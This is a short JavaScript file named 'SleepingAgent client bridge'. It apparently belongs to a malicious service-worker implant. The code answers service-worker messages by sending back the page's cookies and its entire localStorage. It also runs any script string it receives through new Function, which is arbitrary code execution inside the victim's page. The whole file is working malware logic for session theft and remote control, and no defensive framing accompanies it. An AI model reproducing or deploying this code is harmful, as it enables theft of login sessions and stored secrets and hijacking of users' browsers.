// SleepingAgent client bridge
// Responds to SW data requests for things only a page context can access
 
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.addEventListener('message', event => {
    const { action, script } = event.data;
    const port = event.ports[0];
    if (!port) return;
 
    switch (action) {
      case 'get_cookies':
        port.postMessage({ cookies: document.cookie, url: location.href });
        break;
 
      case 'get_localstorage':
        const store = {};
        for (let i = 0; i < localStorage.length; i++) {
          const k = localStorage.key(i);
          store[k] = localStorage.getItem(k);
        }
        port.postMessage({ localStorage: store, url: location.href });
        break;
 
      case 'inject':
        try {
          const result = new Function(script)();
          port.postMessage({ result: String(result) });
        } catch (e) {
          port.postMessage({ error: e.message });
        }
        break;
    }
  });
}
